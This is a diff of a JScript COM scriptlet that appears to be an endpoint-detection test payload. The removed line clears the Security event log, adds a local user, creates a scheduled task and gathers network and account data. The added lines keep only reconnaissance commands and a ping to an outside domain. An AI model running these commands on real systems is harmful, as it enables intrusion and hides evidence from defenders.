@@ -5,8 +5,12 @@
     classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
 	<script language="JScript">
 		<![CDATA[
-var r = new ActiveXObject("WScript.Shell").Run("cmd /C mkdir c:\\edrtest & cmd /C ipconfig /all > c:\\edrtest\\ipconfig.txt & cmd /C arp -a > c:\\edrtest\\arp.txt & cmd /C schtasks /create /tn testtask1 /tr c:\\edrtest\\edrtest.vbs /sc ONCE & powershell Compress-Archive -Path c:\\edrtest\\*.txt -Destination c:\\edrtest\\\edrtest.zip & cmd /C wevtutil cl Security & cmd /C ping nato-press.com > c:\\edrtest\\ping.txt & cmd /C net user /add shigeru123 & cmd /C wmic useraccount get /ALL > c:\\edrtest\\useraccount.txt");
-		]]>
+var r = new ActiveXObject("WScript.Shell").Run("ipconfig /all");
+var r = new ActiveXObject("WScript.Shell").Run("arp -a");  
+var r = new ActiveXObject("WScript.Shell").Run("ping nato-press.com");  
+var r = new ActiveXObject("WScript.Shell").Run("wmic useraccount get /ALL");  
+var r = new ActiveXObject("WScript.Shell").Run("whoami");  
+]]>
 </script>
 </registration>
 </scriptlet>
